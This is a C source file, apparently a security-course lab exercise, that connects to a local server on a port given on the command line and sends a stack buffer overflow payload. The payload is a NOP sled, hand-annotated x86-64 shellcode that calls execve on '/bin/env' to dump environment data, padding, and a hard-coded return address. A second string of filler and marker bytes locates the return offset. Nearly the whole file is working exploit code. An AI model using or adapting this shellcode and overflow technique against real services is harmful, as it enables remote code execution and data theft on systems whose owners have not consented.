#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <netdb.h>

char inbuff[1024];

void DoAttack(int PortNo);
void Attack(FILE * outfile);

int main(int argc, char * argv[]){

    char * studStr, *portStr;
    int studLen, portLen;
    int studNo, portNo;
    int i;

    if (argc != 2){
        fprintf(stderr, "usage %s portno\n", argv[0]);
        exit(1);
    }

    portStr = argv[1];
    if ((portLen = strlen(portStr)) < 1){
        fprintf(stderr, "%s: port number must be 1 or more digits\n", argv[0]);
        exit(1);
    }
    for (i = 0; i < portLen; i++){
        if(!isdigit(portStr[i])){
            fprintf(stderr, "%s: port number must be all digits\n", argv[0]);
            exit(1);
        }
    }
    portNo = atoi(portStr);

    fprintf(stderr, "Port Number  %d\n", portNo);

    DoAttack(portNo);

    exit(0);
}

void  DoAttack(int portNo) {
    int server_sockfd;
    int serverlen;

    struct sockaddr_in server_address;

    FILE * outf;
    FILE * inf;
    struct hostent *h;


    server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if((h=gethostbyname("localhost"))==NULL){
        fprintf(stderr,"Host Name Error...");
        exit(1);
    }

    server_address.sin_family = AF_INET;
    memcpy((char *) &server_address.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
    /* server_address.sin_addr.s_addr = htonl(INADDR_ANY); */
    server_address.sin_port = htons(portNo);

    if(connect(server_sockfd,(struct sockaddr*)&server_address,sizeof(struct sockaddr))==-1){
        fprintf(stderr,"Connection out...");
        exit(1);
    }

    outf = fdopen(server_sockfd, "w");

    // add log message here
    Attack(outf);

    inf = fdopen(server_sockfd, "r");
    if (inf == NULL){
        fprintf(stderr,"could not open socket for read");
        exit(1);
    }
    do {
        inbuff[0] = '\0';
        fgets(inbuff,1024,inf);
        if (inbuff[0]){
            fputs(inbuff,stdout);
        }
    } while (!feof(inf));
    fclose(outf);
    fclose(inf);
    return;
}

char compromise[224]={
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,  // 10
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,  // 20
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,  // 30
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,  // 40
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,  // 50
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,  // 60
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,  // 70
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,  // 80
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,  // 90
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,  // 100
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,  // 110
    // start: ; set up data on stack
    0x4D,0x31,0xC0,             // xor r8, r8       ; push 0
    0x41,0x50,                  // push r8
    0x48,0xBF,0x2F,0x62,0x69,0x6E,0x2F,0x65,0x6E,   // mov rdi, '/bin/env'
    0x76,                 
    0x57,                       // push rdi         ; push '/bin/env'
    0x48,0x89,0xE7,             // mov rdi, rsp                 
    0x41,0x50,                  // push r8          ; push 0                
    0x57,                       // push rdi                  
    0x48,0x89,0xE6,             // mov rsi, rsp    
    // load contents of environ in to ads
    0x48,0x31,0xD2,             // xor rdx, rdx     ; clear the RDX register
    0x66,0xBA,0xFF,0x7F,        // mov dx, 0x7fff   ; load 0x7fff into the low 16 bits of RDX (DX)
    0x48,0xC1,0xE2,0x20,        // shl rdx, 32      ; left shift RDX by 32 bits
    0xB9,0x01,0xC6,0xFB,0xF7,   // mov ecx, 0xf7fbC601 ; load 0xf7fbc601 into the low 32 bits of RCX (ECX)
    0x30,0xC9,                  // xor cl, cl       ; clear the low 8 bits of RCX (CL)
    0x48,0x09,0xCA,             // or rdx, rcx      ; combine the registers using the OR instruction                         
    // load the RDX register with the memory pointed to by the RDX register
    0x48,0x8B,0x12,             // mov rdx, [rdx]                         
    // set up system call
    0x48,0x31,0xC0,
    0xB0,0x3B,                  // mov al,0x3B
    0x0F,0x05,                  // syscall
    // exit system call                            
    0x48,0x89,0xC7,             // mov rdi, rax     ; Move the RAX register to RDI
    0x48,0x31,0xC0,             // xor rdx, rdx  
    0xB0,0x3C,                  // mov al,0x3c      ; Move the value 0x3c to RA
    0x0F,0x05,                  // syscall
    // Space for data so stack does not overflow the code.
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,    // (106) + 110 nops = 216 bytes
    // Return address
    0xC0,0xDE,0xff,0xff,0xff,0x7f,  // rsp - 216 = 0x7fffffffdf58 - 216 = 0x7fffffffdeC0
    0x0A,0x00                       // '\n', NULL
};

char * compromise1=
    "xxxxxxxxxxxxxxxxxxxx"  // 20
    "xxxxxxxxxxxxxxxxxxxx"  // 40
    "xxxxxxxxxxxxxxxxxxxx"  // 60
    "xxxxxxxxxxxxxxxxxxxx"  // 80
    "xxxxxxxxxxxxxxxxxxxx"  // 100
    "xxxxxxxxxxxxxxxxxxxx"  // 120
    "xxxxxxxxxxxxxxxxxxxx"  // 140
    "xxxxxxxxxxxxxxxxxxxx"  // 160
    "xxxxxxxxxxxxxxxxxxxx"  // 180
    "xxxxxxxxxxxxxxxxxxxx"  // 200
    "xxxxxxxx"              // 208
    "MNOPWXYZ"              // 216  4D 4E 4F 50 57 58 59 5A
    "xxxxxxxx\n";           // 224

// change to write so we can write NULLs
void Attack(FILE * outfile){
    fprintf(outfile, "%s", compromise);  
    fflush(outfile);
}

